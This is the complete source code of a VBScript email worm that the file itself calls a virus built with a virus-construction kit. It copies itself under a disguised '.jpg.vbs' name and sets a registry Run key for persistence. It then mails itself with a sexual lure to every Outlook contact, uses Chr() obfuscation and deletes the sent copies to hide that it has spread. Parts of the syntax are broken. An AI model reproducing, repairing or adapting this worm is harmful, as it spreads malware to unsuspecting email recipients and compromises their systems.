'VBS.Phirus.Dom a.k.a. Shai  | Created by: Dom @ 3.11.2006 <Phirus-Constructor>
Set btybxq3 = createobject("scripting.filesystemobject")
xpnoer1 = btybxq3.getspecialfolder(0)
xhefmf5 = xpnoer1 & "\MyPhirus.jpg.vbs"
Set kmjdjt8 = createobject("wscript.shell")
btybxq3.copyfile wscript.scriptfullname, xhefmf5
kmjdjt8.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\This_is_NO_Phirus, "wscript.exe " & xhefmf5 & " %"
If kmjdjt8.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Dom a.k.a. Shai ybpiox6") <> 1 then
vpevue1
End If
Function vpevue1()
Set ttblpr6 = CreateObject("Outlook.Application")
If ttblpr6 = "Outlook" Then
Set gafpmh8 = ttblpr6.GetNameSpace("MAPI")
Set unlukl6 = gafpmh8.AddressLists
For Each rchjxq2 In unlukl6
If rchjxq2.AddressEntries.Count <> 0 Then
wgexme7 = rchjxq2.AddressEntries.Count
For dmcujt1 = 1 To wgexme7
Set rsohnq4 = ttblpr6.CreateItem(0)
Set oodotd3 = rchjxq2.AddressEntries(dmcujt1)
rsohnq4.To = oodotd3.Address
rsohnq4.Subject = hot babe!!
rsohnq4.Body = Hey!
This is an xxx picture of a hot babe!
VERY hot! :)

execute "Set smakik4 = rsohnq4." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
rsohnq4.DeleteAfterSubmit = True
smakik4.Add xhefmf5
If rsohnq4.To <> "" Then
rsohnq4.Send
End If
Next
End If
Next
End If
End Function

'THIS VIRUS IS CREATED WITH
'VBS Phirus-Constructor!
